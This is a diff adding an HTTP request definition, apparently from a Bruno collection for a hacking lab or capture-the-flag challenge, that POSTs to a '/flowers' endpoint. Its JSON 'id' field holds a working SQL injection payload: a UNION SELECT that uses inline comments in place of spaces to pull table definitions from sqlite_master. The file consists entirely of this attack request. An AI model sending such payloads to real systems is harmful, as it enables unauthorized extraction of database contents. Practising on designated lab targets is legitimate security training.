@@ -1,0 +1,17 @@
+meta {
+  name: getTable
+  type: http
+  seq: 2
+}
+
+post {
+  url: http://sql.slh.cyfr.ch/flowers
+  body: json
+  auth: none
+}
+
+body:json {
+  {
+    "id": "1/**/UNION/**/SELECT/**/sql,/**/null,/**/null,/**/null/**/FROM/**/sqlite_master--"
+  }
+}
